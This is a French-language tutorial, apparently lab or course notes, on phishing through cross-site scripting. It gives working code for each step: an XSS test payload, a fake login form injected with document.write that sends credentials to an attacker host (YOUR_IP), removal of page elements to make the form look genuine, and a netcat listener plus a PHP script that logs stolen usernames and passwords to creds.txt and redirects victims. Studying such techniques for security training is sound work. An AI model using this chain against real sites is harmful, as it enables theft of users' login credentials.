# Phishing

### <mark style="color:blue;">**1. Introduction à l'attaque XSS et Phishing**</mark>

* **XSS (Cross-Site Scripting)** est une vulnérabilité permettant d'exécuter du JavaScript malveillant sur un site Web.
* **Phishing** via XSS implique l'injection de faux formulaires de connexion pour voler les identifiants des victimes.

***

### <mark style="color:blue;">**2. Découverte de la vulnérabilité XSS**</mark>

* Lors de l'examen d'une application web vulnérable à XSS, l'attaque commence par tester des **payloads XSS** pour voir si le JavaScript s'exécute.

```html
<img src="" onerror=alert(window.origin)>
```

* Si le **payload XSS** n'exécute rien, il faut ajuster les tests pour identifier un code malveillant qui fonctionne sur la page.

***

### <mark style="color:blue;">**3. Injection de formulaire de connexion (Phishing)**</mark>

* Une fois que l'on trouve un **payload XSS fonctionnel**, on peut injecter un **formulaire de connexion** qui enverra les identifiants de la victime à un serveur malveillant.
* Exemple de code HTML pour un formulaire de connexion :

```html
<h3>Please login to continue</h3>
<form action="http://YOUR_IP">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

***

### <mark style="color:blue;">**4. Injection JavaScript via XSS**</mark>

* Utilisation de la fonction `document.write()` pour injecter le code HTML du formulaire dans la page vulnérable.
* Exemple de code JavaScript :

{% code overflow="wrap" fullWidth="true" %}
```javascript
document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
{% endcode %}

***

### <mark style="color:blue;">**5. Suppression de champs inutiles**</mark>

* Pour augmenter la crédibilité, on peut **supprimer** les champs inutiles comme le champ URL de la page pour ne laisser que le formulaire de connexion visible :

```javascript
document.getElementById('urlform').remove();
```

***

### <mark style="color:blue;">**6. Nettoyage du code HTML**</mark>

* Pour s'assurer que le formulaire est bien le seul élément visible, le reste du HTML peut être commenté.

```html
<!-- ...payload... -->
```

***

### <mark style="color:blue;">**7. Collecte des identifiants**</mark>

* Lorsqu'une victime soumet ses identifiants, le **formulaire XSS** envoie ces données à un serveur malveillant.
* Pour récupérer ces informations, on peut utiliser un serveur **Netcat** ou **PHP**.

**Netcat Listener :**

```bash
sudo nc -lvnp 80
```

* Ou utiliser un script PHP pour enregistrer les identifiants dans un fichier texte (`creds.txt`).

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

**Démarrer le serveur PHP**

* Pour capturer les informations et rediriger la victime vers la page d'origine :

```bash
sudo php -S 0.0.0.0:80
```

* Une fois que la victime se connecte, ses identifiants sont enregistrés dans `creds.txt`.
